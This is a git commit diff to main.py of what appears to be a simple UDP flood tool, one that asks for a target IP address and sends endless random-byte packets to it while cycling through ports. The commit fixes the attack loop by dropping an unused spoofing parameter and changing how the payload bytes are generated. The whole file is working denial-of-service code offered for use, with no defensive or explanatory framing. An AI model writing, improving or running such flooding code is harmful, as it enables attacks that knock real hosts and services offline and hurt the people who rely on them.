ae630f85c3f2043034a950d54aa7e192aaee6f0b
cerberus <155488884+X-The-Mystic@users.noreply.github.com>
2024-01-17 17:22:56 -0500

    Update main.py

--- main.py
+++ main.py
@@ -8,7 +8,6 @@ print("         |            Version: 0.1             |")
 print("         +-------------------------------------+ ")
 
 print("\n\n")
-
 print("Enter IP Address of The Target ")
 target = input("\t == > ")
 print("Enter The Fake IP Address that you want to spoof.")
@@ -22,20 +21,26 @@ attack_num = 0
 
 print("Sending Packets...")
 
-def attack(target, fake_ip, port):
+def attack(target, port):
+    global attack_num  # Declare attack_num as global variable
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         for i in range(1, 100**1000):
-            sock.sendto(random.randbytes(10)*1000, (target, port))
+            sock.sendto(
+                bytes([random.randint(0, 255) for _ in range(10)])*1000, 
+                (target, port)
+            )
             print(f"Sent: {i}")
             attack_num += 1
         while True:
-            sock.sendto(random.randbytes(10)*1000, (target, port))
+            sock.sendto(
+                bytes([random.randint(0, 255) for _ in range(10)])*1000, 
+                (target, port)
+            )
             attack_num += 1
             port = (port + 1) % 65535
             print(f"Sent {attack_num} packet to {target} through port: {port}")
-
     except Exception as e:
         print("An error occurred during the attack:", e)
 
-attack(target, fake_ip, port)
+attack(target, port)
